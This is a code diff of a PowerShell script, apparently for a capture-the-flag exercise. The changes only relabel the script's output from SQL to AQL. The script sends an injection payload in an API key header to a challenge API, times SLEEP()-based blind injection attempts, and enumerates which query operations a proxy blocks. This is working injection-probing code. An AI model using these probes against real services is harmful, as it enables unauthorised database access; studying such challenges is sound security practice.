@@ -60,7 +60,7 @@ $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
 $session.UserAgent = "Mozilla/5.0"
 
 $apikey = " `' OR 1==1"
-"Timing sql inject known to NOT work: "
+"Timing AQL inject with no SLEEP(): "
 "X-API-Key:" + $apikey
 
 $sw = [Diagnostics.Stopwatch]::StartNew()
@@ -74,7 +74,7 @@ Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbi
 $sw.Stop()
 $sw.Elapsed | Select TotalMilliseconds | fl
 
-"Timing sql inject likely to work: "
+"Timing AQL inject with increasing SLEEP() times: "
 # loop through sleep timings from 0.2 thru 3.0, stepping by 0.2
 1..15 | % {
     $step = $_ * 2 / 10
@@ -98,7 +98,7 @@ if(-not (Test-Path -Path sql-op-list.txt)){
     return
 }
 else{
-    "Checking sql operations for proxy filtering: "
+    "Checking AQL operations for proxy filtering: "
     $ops = Get-Content -Path sql-op-list.txt
     $output = $(foreach($op in $ops) {
         
@@ -118,8 +118,8 @@ else{
         }
     })
     
-    "Blocked SQL operations:"
+    "Blocked AQL operations:"
     $output | Select-String -Pattern "Blocked"
-    "`nAvailable SQL operations:"
+    "`nAvailable AQL operations:"
     $output | Select-String -Pattern "Blocked" -NotMatch
 }
